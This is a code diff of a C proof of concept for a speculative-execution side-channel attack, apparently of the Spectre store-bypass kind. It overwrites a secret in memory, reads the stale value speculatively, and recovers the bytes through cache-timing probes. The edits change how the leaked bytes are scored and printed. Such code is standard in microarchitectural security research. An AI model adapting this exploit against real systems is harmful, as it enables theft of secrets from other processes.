@@ -35,11 +35,12 @@ int junk = 0;
 
 
 
-char access_array(int x) {
+void access_array(int x) {
   int tmp;
   // store secret in data
   strcpy(data, SECRET);
-  printf("ptr of contention location: %p\n", &data[x]);
+  //printf("%s\n",data);
+  //printf("ptr of contention location: %p\n", &data[x]);
 
   // flushing the data which is used in the condition increases
   // probability of speculation
@@ -61,8 +62,9 @@ char access_array(int x) {
   // overwrite data via different pointer
   // pointer chasing makes this extremely slow
   //printf("%c", data[x]);
-  (*(*(*data_ultraslowptr)))[x] = OVERWRITE;
-  maccess(mem + data[x]*4096);
+    (*(*(*data_ultraslowptr)))[x] = OVERWRITE;
+    tmp = *(mem + data[x]*4096);
+  //maccess(mem + data[x]*4096);
 
   // data[x] should now be "#"
   // uncomment next line to break attack
@@ -76,7 +78,7 @@ char access_array(int x) {
 int main(int argc, const char **argv) {
     int results[256];
     int j, k;
-  data = malloc(128);
+  data = malloc(128*sizeof(char));
   // Detect cache threshold
   
   int pagesize = 4096;
@@ -92,37 +94,48 @@ int main(int argc, const char **argv) {
   flush(mem,pagesize);
 
   // nothing leaked so far
-  char * leaked = malloc(sizeof(SECRET) + 1);
-  memset(leaked, ' ', sizeof(SECRET) + 1);
-  leaked[sizeof(SECRET)] = 0;
+  //char * leaked = malloc(sizeof(SECRET) + 1);
+  //memset(leaked, ' ', sizeof(SECRET) + 1);
+  //leaked[sizeof(SECRET)] = 0;
 
-  for (int i =0; i < 10; i++) {
-    for (j = 0; j < 256; j++) {
-        results[j] = 0;
-    }
-    // for every byte in the string
-    _mm_mfence();
+  for (int z =0; z < 10; z++) {
+      for (j = 0; j < 256; j++) {
+          results[j] = 0;
+      }
+      // for every byte in the string
+      _mm_mfence();
 
-    // overwrite value with X, then access
-    access_array(i % sizeof(SECRET));
+      // overwrite value with X, then access
+      access_array(z % sizeof(SECRET));
 
-    _mm_mfence(); // avoid speculation
-    // Recover data from covert channel
-    probe(mem,80,pagesize,results);
-    _mm_mfence();
-    k = -1;
-    for (j = 0; j < 256; j++) {
-        if (k < 0 || results[j] > results[k]) {
-            k = j;
-        }  
-    }
-    leaked[i % sizeof(SECRET)] = (char)k;
-    }
+      _mm_mfence(); // avoid speculation
+      // Recover data from covert channel
+      probe(mem, 80, pagesize, results);
+      _mm_mfence();
+      j = k = -1;
+      for (int i = 0; i < 256; i++) {
+          if (j < 0 || results[i] >= results[j]) {
+              k = j;
+              j = i;
+          } else if (k < 0 || results[i] >= results[k]) {
+              k = i;
+          }
+      }
+      printf("j,results[j]: %c,%d\n",j,results[j]);
+      printf("k,results[k]: %c,%d\n",k,results[k]);
+  }
 
-  printf("%s", leaked);
+  /* if ((results[j] >= 2 * results[k] + 5) ||
+      (results[j] == 2 && results[k] == 0)) {
+      break;
+  } */
+
+  printf("%d\n",junk);
+
+  //printf("%s", leaked);
   free(data);
   free(mem);
-  free(leaked);
+  //free(leaked);
 
   return 0;
 }
